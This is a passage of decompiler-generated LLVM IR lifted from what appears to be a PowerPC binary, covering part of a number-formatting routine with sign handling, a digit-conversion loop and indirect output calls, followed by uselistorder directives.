dec_label_pc_10012150:                            ; preds = %dec_label_pc_10012144
  %v1_10012150 = icmp slt i32 %v0_10012150, 0
  %v3_10012150 = icmp eq i32 %v0_10012150, 0
  store i1 %v1_10012150, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012150, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012150, label %dec_label_pc_10012158, label %dec_label_pc_10012168

dec_label_pc_10012158:                            ; preds = %dec_label_pc_10012150
  %v0_10012158 = load i32, i32* %r31.global-to-local, align 4
  %v1_10012158 = icmp slt i32 %v0_10012158, 103
  %v3_10012158 = icmp eq i32 %v0_10012158, 103
  store i1 %v1_10012158, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012158, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012158, label %dec_label_pc_10012188, label %dec_label_pc_10012160

dec_label_pc_10012160:                            ; preds = %dec_label_pc_10012158
  %v0_10012160 = load i32, i32* %r30.global-to-local, align 4
  %v1_10012160 = icmp slt i32 %v0_10012160, 0
  %v3_10012160 = icmp eq i32 %v0_10012160, 0
  store i1 %v1_10012160, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012160, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_10012160, 1
  br i1 %tmp79, label %dec_label_pc_10012188, label %dec_label_pc_10012168

dec_label_pc_10012168:                            ; preds = %dec_label_pc_10012150, %dec_label_pc_10012144, %dec_label_pc_10012160
  %v2_10012170 = inttoptr i32 %v1_10012170 to i32*
  store i32 112, i32* %v2_10012170, align 4
  store i32 ptrtoint (i32* @global_var_10018138.698 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1001217c = load i32, i32* @r8, align 4
  %v2_1001217c = add i32 %v1_1001217c, 8
  %v3_1001217c = inttoptr i32 %v2_1001217c to i32*
  store i32 ptrtoint (i32* @global_var_10018138.698 to i32), i32* %v3_1001217c, align 4
  %v0_10012180 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012180 = load i32, i32* @r8, align 4
  %v2_10012180 = add i32 %v1_10012180, 4
  %v3_10012180 = inttoptr i32 %v2_10012180 to i32*
  store i32 %v0_10012180, i32* %v3_10012180, align 4
  %v0_10012184 = load i32, i32* @r8, align 4
  %v1_10012184 = add i32 %v0_10012184, 12
  store i32 %v1_10012184, i32* @r8, align 4
  br label %dec_label_pc_10012188

dec_label_pc_10012188:                            ; preds = %dec_label_pc_10012160, %dec_label_pc_10012158, %dec_label_pc_10012168
  %v1_10012198 = phi i32 [ %v1_10012170, %dec_label_pc_10012160 ], [ %v1_10012170, %dec_label_pc_10012158 ], [ %v1_10012184, %dec_label_pc_10012168 ]
  %v0_10012188 = load i32, i32* %r10.global-to-local, align 4
  %v1_10012188 = add i32 %v0_10012188, 1
  store i32 %v1_10012188, i32* %r10.global-to-local, align 4
  %v4_10012188 = icmp eq i32 %v1_10012188, 0
  br i1 %v4_10012188, label %dec_label_pc_100121b0, label %dec_label_pc_10012190

dec_label_pc_10012190:                            ; preds = %dec_label_pc_10012188
  %v1_10012190 = sub i32 -1, %v0_10012188
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_10012198 = add i32 %v1_10012198, 4
  %v3_10012198 = inttoptr i32 %v2_10012198 to i32*
  store i32 %v1_10012190, i32* %v3_10012198, align 4
  store i32 ptrtoint (i32* @global_var_1001812b.697 to i32), i32* %r9.global-to-local, align 4
  %v0_100121a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100121a4 = load i32, i32* @r8, align 4
  %v2_100121a4 = inttoptr i32 %v1_100121a4 to i32*
  store i32 %v0_100121a4, i32* %v2_100121a4, align 4
  %v0_100121a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100121a8 = load i32, i32* @r8, align 4
  %v2_100121a8 = add i32 %v1_100121a8, 8
  %v3_100121a8 = inttoptr i32 %v2_100121a8 to i32*
  store i32 %v0_100121a8, i32* %v3_100121a8, align 4
  %v0_100121ac = load i32, i32* @r8, align 4
  %v1_100121ac = add i32 %v0_100121ac, 12
  store i32 %v1_100121ac, i32* @r8, align 4
  br label %dec_label_pc_100121b0

dec_label_pc_100121b0:                            ; preds = %dec_label_pc_10012188, %dec_label_pc_10012190
  %v1_100121bc = phi i32 [ %v1_10012198, %dec_label_pc_10012188 ], [ %v1_100121ac, %dec_label_pc_10012190 ]
  %v0_100121b0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100121b0 = icmp slt i32 %v0_100121b0, 0
  %v3_100121b0 = icmp eq i32 %v0_100121b0, 0
  store i1 %v1_100121b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100121b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100121b0, label %dec_label_pc_100121cc, label %dec_label_pc_100121b8

dec_label_pc_100121b8:                            ; preds = %dec_label_pc_100121b0
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_100121bc = load i32, i32* %r6.global-to-local, align 4
  %v2_100121bc = add i32 %v1_100121bc, 8
  %v3_100121bc = inttoptr i32 %v2_100121bc to i32*
  store i32 %v0_100121bc, i32* %v3_100121bc, align 4
  %v0_100121c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100121c0 = load i32, i32* @r8, align 4
  %v2_100121c0 = inttoptr i32 %v1_100121c0 to i32*
  store i32 %v0_100121c0, i32* %v2_100121c0, align 4
  %v0_100121c4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100121c4 = load i32, i32* @r8, align 4
  %v2_100121c4 = add i32 %v1_100121c4, 4
  %v3_100121c4 = inttoptr i32 %v2_100121c4 to i32*
  store i32 %v0_100121c4, i32* %v3_100121c4, align 4
  %v0_100121c8 = load i32, i32* @r8, align 4
  %v1_100121c8 = add i32 %v0_100121c8, 12
  store i32 %v1_100121c8, i32* @r8, align 4
  br label %dec_label_pc_100121cc

dec_label_pc_100121cc:                            ; preds = %dec_label_pc_100121b0, %dec_label_pc_100121b8
  %v1_100121f4 = phi i32 [ %v1_100121bc, %dec_label_pc_100121b0 ], [ %v1_100121c8, %dec_label_pc_100121b8 ]
  %v0_100121cc = load i32, i32* %r31.global-to-local, align 4
  %v1_100121cc = icmp slt i32 %v0_100121cc, 103
  %v3_100121cc = icmp eq i32 %v0_100121cc, 103
  store i1 %v1_100121cc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100121cc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100121cc, label %dec_label_pc_100121d4, label %dec_label_pc_100121e0

dec_label_pc_100121d4:                            ; preds = %dec_label_pc_100121cc
  %v3_100121d4 = load i32, i32* %v2_10011d14, align 4
  store i32 %v3_100121d4, i32* %r0.global-to-local, align 4
  %v1_100121d8 = and i32 %v3_100121d4, 16
  store i32 %v1_100121d8, i32* %r9.global-to-local, align 4
  %v3_100121d8 = icmp eq i32 %v1_100121d8, 0
  br i1 %v3_100121d8, label %dec_label_pc_1001220c, label %dec_label_pc_100121e0

dec_label_pc_100121e0:                            ; preds = %dec_label_pc_100121cc, %dec_label_pc_100121d4
  %v0_100121e0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100121e0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100121e0 = sub i32 %v1_100121e0, %v0_100121e0
  store i32 %v2_100121e0, i32* %r9.global-to-local, align 4
  %v1_100121e4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100121e4 = icmp sgt i32 %v1_100121e4, %v2_100121e0
  %v4_100121e4 = icmp eq i32 %v1_100121e4, %v2_100121e0
  store i1 %v2_100121e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100121e4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100121e4, label %dec_label_pc_100121ec, label %dec_label_pc_1001220c

dec_label_pc_100121ec:                            ; preds = %dec_label_pc_100121e0
  %v2_100121ec = sub i32 %v1_100121e4, %v2_100121e0
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_100121f4 = add i32 %v1_100121f4, 4
  %v3_100121f4 = inttoptr i32 %v2_100121f4 to i32*
  store i32 %v2_100121ec, i32* %v3_100121f4, align 4
  store i32 ptrtoint (i32* @global_var_1001812b.697 to i32), i32* %r9.global-to-local, align 4
  %v0_10012200 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012200 = load i32, i32* @r8, align 4
  %v2_10012200 = inttoptr i32 %v1_10012200 to i32*
  store i32 %v0_10012200, i32* %v2_10012200, align 4
  %v0_10012204 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012204 = load i32, i32* @r8, align 4
  %v2_10012204 = add i32 %v1_10012204, 8
  %v3_10012204 = inttoptr i32 %v2_10012204 to i32*
  store i32 %v0_10012204, i32* %v3_10012204, align 4
  %v0_10012208 = load i32, i32* @r8, align 4
  %v1_10012208 = add i32 %v0_10012208, 12
  store i32 %v1_10012208, i32* @r8, align 4
  br label %dec_label_pc_1001220c

dec_label_pc_1001220c:                            ; preds = %dec_label_pc_100121e0, %dec_label_pc_100121d4, %dec_label_pc_100121ec
  %v1_100122a037 = phi i32 [ %v1_100121f4, %dec_label_pc_100121e0 ], [ %v1_100121f4, %dec_label_pc_100121d4 ], [ %v1_10012208, %dec_label_pc_100121ec ]
  %v0_1001220c = load i32, i32* %r4.global-to-local, align 4
  %v1_1001220c = icmp slt i32 %v0_1001220c, 102
  %v3_1001220c = icmp eq i32 %v0_1001220c, 102
  store i1 %v1_1001220c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001220c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001220c, label %dec_label_pc_10012294, label %dec_label_pc_10012214

dec_label_pc_10012214:                            ; preds = %dec_label_pc_1001220c
  %v0_10012214 = load i32, i32* @r7, align 4
  %v1_10012214 = icmp slt i32 %v0_10012214, 0
  %v3_10012214 = icmp eq i32 %v0_10012214, 0
  store i1 %v1_10012214, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012214, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_10012214, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_10012214, -1
  br i1 %tmp80, label %dec_label_pc_10012230, label %dec_label_pc_10012228

dec_label_pc_10012228:                            ; preds = %dec_label_pc_10012214
  %v1_10012228 = sub i32 0, %v0_10012214
  store i32 %v1_10012228, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10012230

dec_label_pc_10012230:                            ; preds = %dec_label_pc_10012214, %dec_label_pc_10012228
  %v0_1001224431 = phi i32 [ %v0_10012214, %dec_label_pc_10012214 ], [ %v1_10012228, %dec_label_pc_10012228 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10012234 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_10012234, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10012244

dec_label_pc_10012244:                            ; preds = %dec_label_pc_10012244.backedge, %dec_label_pc_10012230
  %v2_10012264 = phi i32 [ %v3_10012264, %dec_label_pc_10012244.backedge ], [ %v2_10012234, %dec_label_pc_10012230 ]
  %v0_10012248 = phi i32 [ %v0_10012248.pre, %dec_label_pc_10012244.backedge ], [ 2, %dec_label_pc_10012230 ]
  %v1_10012244 = phi i32 [ %v1_10012244.pre, %dec_label_pc_10012244.backedge ], [ 10, %dec_label_pc_10012230 ]
  %v1_10012258 = phi i32 [ %v0_10012244.pre, %dec_label_pc_10012244.backedge ], [ %v0_1001224431, %dec_label_pc_10012230 ]
  %v2_10012244 = sdiv i32 %v1_10012258, %v1_10012244
  store i32 %v2_10012244, i32* %r0.global-to-local, align 4
  %v1_10012248 = add i32 %v0_10012248, 1
  store i32 %v1_10012248, i32* @r7, align 4
  %v1_1001224c = icmp slt i32 %v1_10012248, 3
  %v3_1001224c = icmp eq i32 %v1_10012248, 3
  store i1 %v1_1001224c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001224c, i1* %cr7_eq.global-to-local, align 1
  %v1_10012254 = icmp slt i32 %v2_10012244, 0
  %v2_10012254 = icmp sgt i32 %v2_10012244, 0
  %v3_10012254 = icmp eq i32 %v2_10012244, 0
  store i1 %v1_10012254, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10012254, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10012254, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_10012244, -10
  store i32 %v2_10012244, i32* %r11.global-to-local, align 4
  %v2_10012258 = add i32 %v1_10012258, 48
  %v1_10012260 = add i32 %v2_10012258, %tmp81
  store i32 %v1_10012260, i32* %r9.global-to-local, align 4
  %v1_10012264 = trunc i32 %v1_10012260 to i8
  %v3_10012264 = add i32 %v2_10012264, -1
  %v4_10012264 = inttoptr i32 %v3_10012264 to i8*
  store i8 %v1_10012264, i8* %v4_10012264, align 1
  store i32 %v3_10012264, i32* %r10.global-to-local, align 4
  %v0_10012268 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10012268 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10012268 = or i1 %v0_10012268, %v1_10012268
  br i1 %v2_10012268, label %dec_label_pc_10012244.backedge, label %dec_label_pc_1001226c

dec_label_pc_10012244.backedge:                   ; preds = %dec_label_pc_10012244, %dec_label_pc_1001226c
  %v0_10012244.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10012244.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_10012248.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10012244

dec_label_pc_1001226c:                            ; preds = %dec_label_pc_10012244
  %v0_1001226c = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_1001226c, label %dec_label_pc_10012270, label %dec_label_pc_10012244.backedge

dec_label_pc_10012270:                            ; preds = %dec_label_pc_1001226c
  %v1_10012270 = add i32 %v2_10012264, -2
  store i32 %v1_10012270, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_10012278 = add i32 %v2_10012264, -3
  store i32 %v1_10012278, i32* %r11.global-to-local, align 4
  %v0_1001227c = load i32, i32* %r4.global-to-local, align 4
  %v1_1001227c = trunc i32 %v0_1001227c to i8
  %v4_1001227c = inttoptr i32 %v1_10012270 to i8*
  store i8 %v1_1001227c, i8* %v4_1001227c, align 1
  %v0_10012280 = load i32, i32* %r5.global-to-local, align 4
  %v1_10012280 = trunc i32 %v0_10012280 to i8
  %v2_10012280 = load i32, i32* %r9.global-to-local, align 4
  %v3_10012280 = add i32 %v2_10012280, -1
  %v4_10012280 = inttoptr i32 %v3_10012280 to i8*
  store i8 %v1_10012280, i8* %v4_10012280, align 1
  %v0_10012284 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012284 = load i32, i32* @r8, align 4
  %v2_10012284 = inttoptr i32 %v1_10012284 to i32*
  store i32 %v0_10012284, i32* %v2_10012284, align 4
  %v0_10012288 = load i32, i32* @r7, align 4
  %v1_10012288 = load i32, i32* @r8, align 4
  %v2_10012288 = add i32 %v1_10012288, 4
  %v3_10012288 = inttoptr i32 %v2_10012288 to i32*
  store i32 %v0_10012288, i32* %v3_10012288, align 4
  %v0_1001228c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001228c = load i32, i32* @r8, align 4
  %v2_1001228c = add i32 %v1_1001228c, 8
  %v3_1001228c = inttoptr i32 %v2_1001228c to i32*
  store i32 %v0_1001228c, i32* %v3_1001228c, align 4
  %v0_10012290 = load i32, i32* @r8, align 4
  %v1_10012290 = add i32 %v0_10012290, 12
  store i32 %v1_10012290, i32* @r8, align 4
  br label %dec_label_pc_10012294

dec_label_pc_10012294:                            ; preds = %dec_label_pc_1001220c, %dec_label_pc_10011de8, %dec_label_pc_10012270
  %v0_10012310 = phi i32 [ %v1_100122a037, %dec_label_pc_1001220c ], [ %v2_10011df4, %dec_label_pc_10011de8 ], [ %v1_10012290, %dec_label_pc_10012270 ]
  %v2_10012294 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_10012294, i32* %r9.global-to-local, align 4
  %v1_100122a4.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10012298

dec_label_pc_10012298:                            ; preds = %dec_label_pc_10012298, %dec_label_pc_10012294
  %v1_100122a4 = phi i32 [ %v2_100122a4, %dec_label_pc_10012298 ], [ %v1_100122a4.pre, %dec_label_pc_10012294 ]
  %v0_10012298 = phi i32 [ %v1_1001229c, %dec_label_pc_10012298 ], [ %v2_10012294, %dec_label_pc_10012294 ]
  %v1_10012298 = inttoptr i32 %v0_10012298 to i32*
  %v2_10012298 = load i32, i32* %v1_10012298, align 4
  store i32 %v2_10012298, i32* %r0.global-to-local, align 4
  %v1_1001229c = add i32 %v0_10012298, 12
  store i32 %v1_1001229c, i32* %r9.global-to-local, align 4
  %v2_100122a0 = icmp ult i32 %v1_1001229c, %v0_10012310
  %v2_100122a4 = sub i32 %v1_100122a4, %v2_10012298
  store i32 %v2_100122a4, i32* @r28, align 4
  br i1 %v2_100122a0, label %dec_label_pc_10012298, label %dec_label_pc_100122ac

dec_label_pc_100122ac:                            ; preds = %dec_label_pc_10012298
  %v4_100122a0 = icmp eq i32 %v1_1001229c, %v0_10012310
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100122a0, i1* %cr7_eq.global-to-local, align 1
  %v3_100122ac = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* %r10.global-to-local, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_10012310, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_100122ac, 0
  %v1_100122c0 = zext i1 %tmp85 to i32
  store i32 %v1_100122c0, i32* %r9.global-to-local, align 4
  %v2_100122c4 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_100122c4, i32* %r0.global-to-local, align 4
  %v2_100122c8 = sub i32 %v2_100122a4, %v1_100122c0
  store i32 %v2_100122c8, i32* %r11.global-to-local, align 4
  %tmp82 = icmp slt i32 %v2_100122c8, 1
  br i1 %tmp82, label %dec_label_pc_10012334, label %dec_label_pc_100122d8

dec_label_pc_100122d8:                            ; preds = %dec_label_pc_100122ac
  %v3_100122d8 = load i32, i32* %v2_10011d14, align 4
  store i32 %v3_100122d8, i32* %r0.global-to-local, align 4
  %v1_100122dc = and i32 %v3_100122d8, 8
  store i32 %v1_100122dc, i32* @r7, align 4
  %v3_100122dc = icmp eq i32 %v1_100122dc, 0
  br i1 %v3_100122dc, label %dec_label_pc_10012300, label %dec_label_pc_100122e4

dec_label_pc_100122e4:                            ; preds = %dec_label_pc_100122d8
  %v1_100122e8 = add i32 %v0_10012310, 12
  store i32 %v1_100122e8, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1001812b.697 to i32), i32* %r9.global-to-local, align 4
  %v2_100122f0 = inttoptr i32 %v0_10012310 to i32*
  store i32 160, i32* %v2_100122f0, align 4
  %v0_100122f4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100122f4 = load i32, i32* @r8, align 4
  %v2_100122f4 = add i32 %v1_100122f4, 4
  %v3_100122f4 = inttoptr i32 %v2_100122f4 to i32*
  store i32 %v0_100122f4, i32* %v3_100122f4, align 4
  %v0_100122f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100122f8 = load i32, i32* @r8, align 4
  %v2_100122f8 = add i32 %v1_100122f8, 8
  %v3_100122f8 = inttoptr i32 %v2_100122f8 to i32*
  store i32 %v0_100122f8, i32* %v3_100122f8, align 4
  br label %dec_label_pc_10012334

dec_label_pc_10012300:                            ; preds = %dec_label_pc_100122d8
  %v1_10012300 = add i32 %tmp, 16
  %v2_10012300 = inttoptr i32 %v1_10012300 to i32*
  %v3_10012300 = load i32, i32* %v2_10012300, align 4
  store i32 %v3_10012300, i32* %r0.global-to-local, align 4
  %v1_10012304 = icmp slt i32 %v3_10012300, 48
  %v3_10012304 = icmp eq i32 %v3_10012300, 48
  store i1 %v1_10012304, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10012304, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10012304, label %dec_label_pc_1001230c, label %dec_label_pc_10012328

dec_label_pc_1001230c:                            ; preds = %dec_label_pc_10012300
  %v3_1001230c = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_10012310, i32* @r30, align 4
  %v2_10012314 = add i32 %v3_1001230c, %v2_100122c8
  store i32 %v2_10012314, i32* %r0.global-to-local, align 4
  store i32 %v2_10012314, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10012334

dec_label_pc_10012320:                            ; preds = %dec_label_pc_1001233c
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_10012370

dec_label_pc_10012328:                            ; preds = %dec_label_pc_10012300
  store i32 %v2_100122a4, i32* %r0.global-to-local, align 4
  store i32 %v0_10012310, i32* @r30, align 4
  br label %dec_label_pc_10012334

dec_label_pc_10012334:                            ; preds = %dec_label_pc_100122ac, %dec_label_pc_1001230c, %dec_label_pc_100122e4, %dec_label_pc_10012328
  store i32 0, i32* @r29, align 4
  %v2_10012338 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_10012338, i32* @r31, align 4
  br label %dec_label_pc_1001233c

dec_label_pc_1001233c:                            ; preds = %dec_label_pc_1001236c, %dec_label_pc_10012334
  %v0_1001234c = phi i32 [ %v1_10012358, %dec_label_pc_1001236c ], [ %v2_10012338, %dec_label_pc_10012334 ]
  %v1_1001233c = inttoptr i32 %v0_1001234c to i32*
  %v2_1001233c = load i32, i32* %v1_1001233c, align 4
  store i32 %v2_1001233c, i32* %r4.global-to-local, align 4
  %v0_10012340 = load i32, i32* @r27, align 4
  store i32 %v0_10012340, i32* %r3.global-to-local, align 4
  %v1_10012344 = add i32 %v0_1001234c, 4
  %v2_10012344 = inttoptr i32 %v1_10012344 to i32*
  %v3_10012344 = load i32, i32* %v2_10012344, align 4
  store i32 %v3_10012344, i32* %r5.global-to-local, align 4
  %v0_10012348 = load i32, i32* @r26, align 4
  store i32 %v0_10012348, i32* %ctr.global-to-local, align 4
  %v1_1001234c = add i32 %v0_1001234c, 8
  %v2_1001234c = inttoptr i32 %v1_1001234c to i32*
  %v3_1001234c = load i32, i32* %v2_1001234c, align 4
  store i32 %v3_1001234c, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10012348)
  %v0_10012354 = load i32, i32* @r31, align 4
  %v1_10012354 = add i32 %v0_10012354, 4
  %v2_10012354 = inttoptr i32 %v1_10012354 to i32*
  %v3_10012354 = load i32, i32* %v2_10012354, align 4
  store i32 %v3_10012354, i32* %r0.global-to-local, align 4
  %v1_10012358 = add i32 %v0_10012354, 12
  store i32 %v1_10012358, i32* @r31, align 4
  %v0_1001235c = load i32, i32* @r29, align 4
  %v1_1001235c = load i32, i32* %r3.global-to-local, align 4
  %v2_1001235c = add i32 %v1_1001235c, %v0_1001235c
  store i32 %v2_1001235c, i32* @r29, align 4
  %v2_10012360 = icmp slt i32 %v1_1001235c, %v3_10012354
  %v4_10012360 = icmp eq i32 %v1_1001235c, %v3_10012354
  store i1 %v2_10012360, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10012360, i1* %cr7_eq.global-to-local, align 1
  %v1_10012364 = load i32, i32* @r30, align 4
  %v2_10012364 = icmp ult i32 %v1_10012358, %v1_10012364
  %v3_10012364 = icmp ugt i32 %v1_10012358, %v1_10012364
  %v4_10012364 = icmp eq i32 %v1_10012358, %v1_10012364
  store i1 %v2_10012364, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10012364, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10012364, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10012360, label %dec_label_pc_1001236c, label %dec_label_pc_10012320

dec_label_pc_1001236c:                            ; preds = %dec_label_pc_1001233c
  br i1 %v2_10012364, label %dec_label_pc_1001233c, label %dec_label_pc_10012370

dec_label_pc_10012370:                            ; preds = %dec_label_pc_1001236c, %dec_label_pc_10012320
  %v0_10012374 = phi i32 [ -1, %dec_label_pc_10012320 ], [ %v2_1001235c, %dec_label_pc_1001236c ]
  store i32 %v0_10011cc4, i32* %r0.global-to-local, align 4
  store i32 %v0_10012374, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012374

; uselistorder directives
  uselistorder i32 %v0_10012374, { 1, 0 }
  uselistorder i32 %v1_1001235c, { 2, 1, 0 }
  uselistorder i32 %v1_10012358, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_10012354, { 1, 0, 2 }
  uselistorder i32 %v0_1001234c, { 0, 2, 1 }
  uselistorder i32 %v3_10012300, { 1, 0, 2 }
  uselistorder i32 %v1_100122c0, { 1, 0 }
  uselistorder i32 %v2_100122a4, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1001229c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10012298, { 1, 0 }
  uselistorder i32 %v0_10012310, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_10012264, { 1, 2, 0 }
  uselistorder i32 %v1_10012248, { 1, 0, 2 }
  uselistorder i32 %v2_10012244, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_10012214, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_100121e4, { 2, 0, 1 }
  uselistorder i32 %v2_100121e0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10012150, { 1, 0 }
  uselistorder i32 %v2_100120b4, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10012088, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10012050, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10012048, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_10012014, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_10012004, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_10011ff8, { 1, 0, 2 }
  uselistorder i32 %v1_10011fdc, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10011f94, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10011f84, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10011f68, { 1, 0 }
  uselistorder i32 %v1_10011f44, { 1, 0 }
  uselistorder i32 %v2_10011f24, { 1, 0, 2 }
  uselistorder i32 %v0_10011ecc, { 1, 0 }
  uselistorder i32 %v1_10011d30, { 1, 0 }
  uselistorder i32 %v0_10011dbc, { 2, 1, 0 }
  uselistorder i32 %v1_10011d04, { 1, 0 }
  uselistorder i32 %v1_10011ce4, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 4, 1, 3, 2, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 4, 1, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 11, 9, 10, 12, 13, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 3, 4, 0, 5, 1, 6, 7, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 8, 9, 10, 14, 16, 15, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 8, 11, 14, 12, 13, 15, 16, 17, 19, 18 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 3, 4, 2, 1, 5 }
  uselistorder i32 45, { 1, 2, 0 }
  uselistorder i32 112, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 176, { 1, 2, 0, 3, 4 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 -2147483648, { 9, 0, 1, 11, 10, 2, 4, 3, 12, 6, 5, 13, 8, 7, 14 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_10018128.695 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0, 2 }
